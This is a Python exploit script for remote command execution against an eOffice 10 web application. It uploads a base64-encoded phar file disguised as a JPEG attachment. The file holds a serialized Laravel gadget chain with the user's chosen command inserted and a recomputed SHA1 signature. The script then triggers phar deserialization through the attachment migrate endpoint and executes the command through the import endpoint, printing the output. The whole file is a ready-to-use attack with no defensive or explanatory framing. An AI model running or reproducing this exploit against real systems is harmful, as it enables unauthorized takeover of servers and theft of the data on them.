# -*- coding:utf-8 -*-
import json
import requests
import urllib3
import hashlib
import re
import time
from hashlib import sha1
import base64
import sys

urllib3.disable_warnings()

def payload(url,cmd):
    proxy = {'http':'http://127.0.0.1:8083'}
    urls = url + '/eoffice10/server/public/api/attachment/atuh-file'
    hearder = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36','Accept': 'string("*/*")'}
    file = base64.b64decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp9AQAAAQAAABEAAAABAAAAAABHAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo2OiJ3aG9hbWkiO319CAAAAHRlc3QudHh0BAAAACpdBmYEAAAADH5/2KQBAAAAAAAAdGVzdO4PPAt4/NUWNWXWAzOoVlseOkFwAgAAAEdCTUI=")
    data = file[:-28]
    data = data.replace(b's:6:"whoami"', b's:'+bytes(str(len(cmd)),encoding="utf-8")+b':"'+bytes(cmd, encoding='utf-8')+b'"')
    final = file[-8:]
    newfile = data + sha1(data).digest() + final
    upload_file = {"Filedata": ("register.inc", newfile, "image/jpeg")}
    response = requests.post(url=urls, files=upload_file, headers=hearder,verify=False,proxies=proxy)
    response_text = response.text
    attachment_id = json.loads(response_text)['data']['attachment_id']

    urls = url + '/eoffice10/server/public/api/attachment/path/migrate'
    heards = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response1 = requests.post(url=urls, data="source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F",headers=heards, verify=False)
    
    urls = url + '/eoffice10/server/public/api/empower/import'
    hearder = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
    data2 = {
        'type': 'tttt',
        'file': attachment_id
    }
    response2 = requests.post(url=urls, data=data2,verify=False, headers=hearder)
    response_text = response2.text
    print(re.sub('\{"status":.*"\}','',response_text))

if __name__ == '__main__':
    if len(sys.argv) == 3:
        url = sys.argv[1]
        cmd = sys.argv[2]
    else:
        print("使用方法：python xxx.py url cmd")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if url.endswith("/"):
        url = url[:-1]
    payload(url,cmd)